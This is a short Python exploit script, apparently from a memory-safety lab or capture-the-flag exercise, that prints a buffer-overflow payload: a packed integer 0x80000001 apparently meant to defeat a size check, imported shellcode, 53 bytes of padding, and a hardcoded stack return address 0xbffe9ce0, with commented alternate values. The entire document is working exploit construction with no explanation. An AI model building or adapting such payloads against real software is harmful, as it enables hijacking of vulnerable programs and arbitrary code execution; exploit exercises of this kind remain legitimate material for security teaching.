from shellcode import shellcode
from struct import pack
print(pack("<I",0x80000001)+shellcode+"a"*53+pack("<I",0xbffe9ce0))
#print pack("<I",0x989ABCDE)
#buf=0xbffe9ce0
